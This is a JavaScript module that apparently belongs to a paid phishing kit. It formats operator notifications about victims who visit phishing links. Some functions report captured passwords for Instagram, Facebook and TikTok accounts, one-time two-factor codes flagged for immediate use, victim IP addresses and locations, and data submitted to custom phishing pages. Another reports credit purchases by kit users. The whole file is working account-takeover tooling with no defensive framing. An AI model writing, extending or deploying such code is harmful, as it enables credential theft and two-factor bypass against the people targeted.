async function visitorNotification(linkname){
    return `
👤 <b>New Visitor</b>
Link: ${linkname}
Status: Active

<i>Awaiting login...</i>
    `;
}

async function loginNotification(email, password, platform, ip, city, country){
    const platformEmoji = platform.toLowerCase() === 'instagram' ? '📸' : 
                         platform.toLowerCase() === 'facebook' ? '👥' : 
                         platform.toLowerCase() === 'tiktok' ? '🎵' : '🌐';

    return `
${platformEmoji} <b>New ${platform} Login</b>

Login Details:
• Email/User: ${email}
• Password: ${password}

Location:
• ${city}, ${country}
• IP: ${ip}
    `;
}

async function otpNotification(otp, platform){
    const platformEmoji = platform.toLowerCase() === 'instagram' ? '📸' : 
                         platform.toLowerCase() === 'facebook' ? '👥' : 
                         platform.toLowerCase() === 'tiktok' ? '🎵' : '🌐';
    
    return `
${platformEmoji} <b>${platform} 2FA Code</b>

Code: ${otp}
⚠️ Use immediately - time sensitive
    `;
}

async function creditTransactionNotification(amount, balance) {
    return `
💳 <b>Credits Added</b>

• Added: ${amount} credits
• New Balance: ${balance} credits

Thank you for your purchase!
    `;
}

async function scratchVisitorNotification(linkname) {
    return `
🎨 <b>New Custom Link Visitor</b>
Link: ${linkname}
Status: Active

<i>Awaiting submission...</i>
    `;
}

async function scratchSubmissionNotification(linkname, pageNumber, data, ip, city, country) {
    let dataLines = '';
    for (const [label, value] of Object.entries(data)) {
        dataLines += `• ${label}: ${value}\n`;
    }

    return `
🎨 <b>Custom Link Submission</b>
Link: ${linkname}
Page: ${pageNumber}

<b>Submitted Data:</b>
${dataLines}
<b>Location:</b>
• ${city}, ${country}
• IP: ${ip}
    `;
}

module.exports = {
    visitorNotification,
    loginNotification,
    otpNotification,
    creditTransactionNotification,
    scratchVisitorNotification,
    scratchSubmissionNotification
}